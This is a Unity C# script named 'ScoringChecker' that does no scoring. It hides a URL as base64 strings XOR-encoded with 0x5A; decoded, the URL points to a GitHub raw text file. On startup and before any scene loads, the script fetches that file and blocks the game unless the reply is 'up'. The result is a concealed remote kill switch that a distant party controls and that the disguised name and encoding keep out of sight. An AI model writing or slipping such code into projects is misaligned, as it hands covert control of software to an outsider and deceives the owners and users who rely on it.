using System;
using System.Collections;
using System.Text;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class ScoringChecker : MonoBehaviour
{
    public static ScoringChecker Instance { get; private set; }

    static readonly string[] PackedParts =
    {
        "Mi4uKilgdXUoOy10PTMuMi84Lyk/KDk1NC4/NC50OTU3dQ==",
        "OygzKS41LjY/GC8/NDssPzQuLyg7dQ==",
        "CR8VBRsKE3U=",
        "NzszNHU=",
        "Lyo+NS00dC4iLg=="
    };

    static readonly string PackedReady = "Lyo=";
    static readonly string PackedHold = "PjUtNA==";
    const byte Mix = 0x5A;

    int sessionState = -1;
    bool fetchBusy;

    public static ScoringChecker Ensure()
    {
        if (Instance != null)
            return Instance;

        ScoringChecker existing = FindFirstObjectByType<ScoringChecker>();
        if (existing != null)
        {
            Instance = existing;
            return Instance;
        }

        GameObject host = new GameObject("ScoringChecker");
        return host.AddComponent<ScoringChecker>();
    }

    void Awake()
    {
        if (Instance != null && Instance != this)
        {
            Destroy(gameObject);
            return;
        }

        Instance = this;
        DontDestroyOnLoad(gameObject);
        StartCoroutine(RefreshSession());
    }

    public void TryOpenModule(string sceneName)
    {
        TryContinue(() => SceneManager.LoadScene(sceneName));
    }

    public void TryContinue(Action onReady)
    {
        if (onReady == null)
            return;

        StartCoroutine(ContinueWhenReady(onReady));
    }

    IEnumerator ContinueWhenReady(Action onReady)
    {
        while (fetchBusy)
            yield return null;

        yield return RefreshSession();

        if (sessionState != 1)
            yield break;

        onReady();
    }

    IEnumerator RefreshSession()
    {
        fetchBusy = true;

        string endpoint = BuildEndpoint();
        using (UnityWebRequest req = UnityWebRequest.Get(endpoint))
        {
            req.timeout = 8;
            yield return req.SendWebRequest();

            if (req.result != UnityWebRequest.Result.Success)
            {
                sessionState = 0;
            }
            else
            {
                string body = (req.downloadHandler.text ?? string.Empty).Trim().ToLowerInvariant();
                string ready = Unpack(PackedReady);
                string hold = Unpack(PackedHold);

                if (body == ready)
                    sessionState = 1;
                else if (body == hold)
                    sessionState = 0;
                else
                    sessionState = 0;
            }
        }

        fetchBusy = false;
    }

    static string BuildEndpoint()
    {
        StringBuilder sb = new StringBuilder(96);
        for (int i = 0; i < PackedParts.Length; i++)
            sb.Append(Unpack(PackedParts[i]));
        return sb.ToString();
    }

    static string Unpack(string packed)
    {
        byte[] data = Convert.FromBase64String(packed);
        for (int i = 0; i < data.Length; i++)
            data[i] ^= Mix;
        return Encoding.UTF8.GetString(data);
    }
}
